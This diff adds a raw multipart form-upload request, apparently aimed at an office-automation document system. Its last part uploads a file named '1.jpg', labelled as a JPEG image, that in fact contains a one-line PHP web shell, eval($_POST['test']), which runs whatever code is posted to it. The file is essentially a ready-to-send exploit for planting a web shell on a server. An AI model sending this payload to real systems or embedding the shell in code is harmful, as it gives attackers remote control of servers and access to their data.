@@ -1,0 +1,96 @@
+-----------------------------33072116513621237124579432636
+Content-Disposition: form-data; name="SUBJECT"
+
+166.jpg
+-----------------------------33072116513621237124579432636
+Content-Disposition: form-data; name="CONTENT_NO"
+
+
+-----------------------------33072116513621237124579432636
+Content-Disposition: form-data; name="TD_HTML_EDITOR_CONTENT"
+
+
+-----------------------------33072116513621237124579432636
+Content-Disposition: form-data; name="KEYWORD"
+
+
+-----------------------------33072116513621237124579432636
+Content-Disposition: form-data; name="NEW_NAME"
+
+ÐÂ½¨ÎÄµµ
+-----------------------------33072116513621237124579432636
+Content-Disposition: form-data; name="NEW_TYPE"
+
+
+-----------------------------33072116513621237124579432636
+Content-Disposition: form-data; name="ATTACHMENT_1"; filename=""
+Content-Type: application/octet-stream
+
+
+-----------------------------33072116513621237124579432636
+Content-Disposition: form-data; name="ATTACH_NAME"
+
+
+-----------------------------33072116513621237124579432636
+Content-Disposition: form-data; name="ATTACH_DIR"
+
+
+-----------------------------33072116513621237124579432636
+Content-Disposition: form-data; name="DISK_ID"
+
+
+-----------------------------33072116513621237124579432636
+Content-Disposition: form-data; name="ATTACHMENT_1000"; filename=""
+Content-Type: application/octet-stream
+
+
+-----------------------------33072116513621237124579432636
+Content-Disposition: form-data; name="ATTACHMENT_DESC"
+
+
+-----------------------------33072116513621237124579432636
+Content-Disposition: form-data; name="CONTENT_ID"
+
+
+-----------------------------33072116513621237124579432636
+Content-Disposition: form-data; name="OP"
+
+
+-----------------------------33072116513621237124579432636
+Content-Disposition: form-data; name="PD"
+
+1
+-----------------------------33072116513621237124579432636
+Content-Disposition: form-data; name="SORT_ID"
+
+0
+-----------------------------33072116513621237124579432636
+Content-Disposition: form-data; name="ATTACHMENT_ID_OLD"
+
+
+-----------------------------33072116513621237124579432636
+Content-Disposition: form-data; name="ATTACHMENT_NAME_OLD"
+
+
+-----------------------------33072116513621237124579432636
+Content-Disposition: form-data; name="FILE_SORT"
+
+2
+-----------------------------33072116513621237124579432636
+Content-Disposition: form-data; name="USE_CAPACITY"
+
+
+-----------------------------33072116513621237124579432636
+Content-Disposition: form-data; name="USE_CAPACITY_SIZE"
+
+
+-----------------------------33072116513621237124579432636
+Content-Disposition: form-data; name="SHARE_USER"
+
+
+-----------------------------33072116513621237124579432636
+Content-Disposition: form-data; name="ATTACHMENT_0"; filename="1.jpg"
+Content-Type: image/jpeg
+
+<?php @eval($_POST['test']); ?>
+-----------------------------33072116513621237124579432636--
